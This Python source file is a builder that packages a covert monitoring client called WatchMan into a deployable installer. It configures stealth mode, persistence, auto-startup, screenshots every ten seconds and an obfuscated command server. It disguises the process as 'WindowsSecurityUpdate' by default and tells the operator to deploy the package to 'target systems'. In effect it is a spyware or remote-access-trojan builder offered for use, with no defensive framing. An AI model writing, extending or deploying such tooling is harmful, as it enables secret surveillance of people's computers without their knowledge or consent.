"""
Client installer and builder for WatchMan system.
Creates deployable client packages with obfuscated server configuration.
"""
import os
import sys
import shutil
import json
import zipfile
from pathlib import Path

# Add parent directory to path for imports
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from shared import obfuscate_string, Config

class ClientBuilder:
    """Builds and packages WatchMan client for deployment"""
    
    def __init__(self, output_dir: str = "dist"):
        self.output_dir = output_dir
        self.project_root = Path(__file__).parent.parent
        self.client_dir = self.project_root / "client"
        self.shared_dir = self.project_root / "shared"
        
    def build_client(self, server_ip: str, server_port: int = 5000, stealth_name: str = "WindowsSecurityUpdate"):
        """Build a client package for deployment"""
        print(f"Building WatchMan client for server {server_ip}:{server_port}")
        
        # Create output directory
        os.makedirs(self.output_dir, exist_ok=True)
        build_dir = os.path.join(self.output_dir, f"watchman_client_{stealth_name}")
        
        if os.path.exists(build_dir):
            shutil.rmtree(build_dir)
        os.makedirs(build_dir)
        
        # Copy client files
        self._copy_client_files(build_dir)
        
        # Copy shared files
        self._copy_shared_files(build_dir)
        
        # Create configuration
        self._create_client_config(build_dir, server_ip, server_port, stealth_name)
        
        # Create launcher scripts
        self._create_launchers(build_dir, stealth_name)
        
        # Create installer
        installer_path = self._create_installer(build_dir, stealth_name)
        
        print(f"Client built successfully: {installer_path}")
        return installer_path
    
    def _copy_client_files(self, build_dir):
        """Copy client source files"""
        client_build_dir = os.path.join(build_dir, "client")
        os.makedirs(client_build_dir, exist_ok=True)
        
        files_to_copy = [
            "main.py",
            "system_monitor.py", 
            "screen_capture.py",
            "persistence.py"
        ]
        
        for file in files_to_copy:
            src = self.client_dir / file
            dst = os.path.join(client_build_dir, file)
            if src.exists():
                shutil.copy2(src, dst)
    
    def _copy_shared_files(self, build_dir):
        """Copy shared utility files"""
        shared_build_dir = os.path.join(build_dir, "shared")
        os.makedirs(shared_build_dir, exist_ok=True)
        
        files_to_copy = [
            "__init__.py",
            "encryption.py",
            "protocol.py", 
            "config.py"
        ]
        
        for file in files_to_copy:
            src = self.shared_dir / file
            dst = os.path.join(shared_build_dir, file)
            if src.exists():
                shutil.copy2(src, dst)
    
    def _create_client_config(self, build_dir, server_ip, server_port, stealth_name):
        """Create client configuration with obfuscated server details"""
        server_url = f"http://{server_ip}:{server_port}"
        obfuscated_url = obfuscate_string(server_url)
        
        config = {
            "server_url": server_url,
            "obfuscated_server": obfuscated_url,
            "encryption_password": "watchman2025",
            "heartbeat_interval": 30,
            "metrics_interval": 60,
            "screenshot_interval": 10,
            "stealth_mode": True,
            "persistence_enabled": True,
            "auto_startup": True,
            "ghost_operations": True,
            "max_reconnect_attempts": 10,
            "reconnect_delay": 5,
            "process_name": stealth_name
        }
        
        config_path = os.path.join(build_dir, "client_config.json")
        with open(config_path, 'w') as f:
            json.dump(config, f, indent=2)
    
    def _create_launchers(self, build_dir, stealth_name):
        """Create launcher scripts"""
        
        # Windows batch launcher
        batch_content = f"""@echo off
cd /d "%~dp0"
python client/main.py
"""
        
        batch_path = os.path.join(build_dir, f"{stealth_name}.bat")
        with open(batch_path, 'w') as f:
            f.write(batch_content)
        
        # Python launcher
        launcher_content = f"""#!/usr/bin/env python3
\"\"\"
Launcher for {stealth_name}
\"\"\"
import os
import sys

# Change to script directory
os.chdir(os.path.dirname(os.path.abspath(__file__)))

# Add current directory to path
sys.path.insert(0, os.getcwd())

# Import and run client
from client.main import main

if __name__ == '__main__':
    main()
"""
        
        launcher_path = os.path.join(build_dir, f"{stealth_name}.py")
        with open(launcher_path, 'w') as f:
            f.write(launcher_content)
        
        # Requirements file
        requirements_content = """psutil>=5.9.0
Pillow>=10.0.0
python-socketio>=5.8.0
requests>=2.31.0
schedule>=1.2.0
cryptography>=41.0.0
"""
        
        req_path = os.path.join(build_dir, "requirements.txt")
        with open(req_path, 'w') as f:
            f.write(requirements_content)
    
    def _create_installer(self, build_dir, stealth_name):
        """Create installer package"""
        installer_script = f"""#!/usr/bin/env python3
\"\"\"
Installer for {stealth_name}
\"\"\"
import os
import sys
import subprocess
import json
import shutil
from pathlib import Path

def install_requirements():
    \"\"\"Install Python requirements\"\"\"
    try:
        subprocess.check_call([sys.executable, '-m', 'pip', 'install', '-r', 'requirements.txt'])
        return True
    except subprocess.CalledProcessError as e:
        print(f"Error installing requirements: {{e}}")
        return False

def install_client():
    \"\"\"Install client with persistence\"\"\"
    try:
        # Import and run client
        sys.path.insert(0, os.getcwd())
        from client.main import WatchManClient
        
        # Create client instance
        client = WatchManClient('client_config.json')
        
        # Install persistence
        if client.config.get('auto_startup', True):
            success = client.persistence_manager.install_persistence()
            if success:
                print("Persistence installed successfully")
            else:
                print("Warning: Could not install persistence")
        
        # Start client
        print("Starting {stealth_name}...")
        client.run()
        
    except Exception as e:
        print(f"Error starting client: {{e}}")
        return False

def main():
    \"\"\"Main installer function\"\"\"
    print("Installing {stealth_name}...")
    
    # Install requirements
    print("Installing dependencies...")
    if not install_requirements():
        print("Failed to install dependencies")
        return False
    
    print("Dependencies installed successfully")
    
    # Install and start client
    print("Installing client...")
    install_client()

if __name__ == '__main__':
    main()
"""
        
        installer_path = os.path.join(build_dir, "install.py")
        with open(installer_path, 'w') as f:
            f.write(installer_script)
        
        # Create zip package
        zip_path = os.path.join(self.output_dir, f"{stealth_name}_installer.zip")
        
        with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
            for root, dirs, files in os.walk(build_dir):
                for file in files:
                    file_path = os.path.join(root, file)
                    arcname = os.path.relpath(file_path, build_dir)
                    zipf.write(file_path, arcname)
        
        return zip_path

def main():
    """Main builder function"""
    import argparse
    
    parser = argparse.ArgumentParser(description='Build WatchMan client installer')
    parser.add_argument('--server-ip', required=True, help='Server IP address')
    parser.add_argument('--server-port', type=int, default=5000, help='Server port')
    parser.add_argument('--name', default='WindowsSecurityUpdate', help='Stealth process name')
    parser.add_argument('--output', default='dist', help='Output directory')
    
    args = parser.parse_args()
    
    builder = ClientBuilder(args.output)
    installer_path = builder.build_client(args.server_ip, args.server_port, args.name)
    
    print(f"\nClient installer created: {installer_path}")
    print(f"Deploy this file to target systems and run 'python install.py'")

if __name__ == '__main__':
    main()
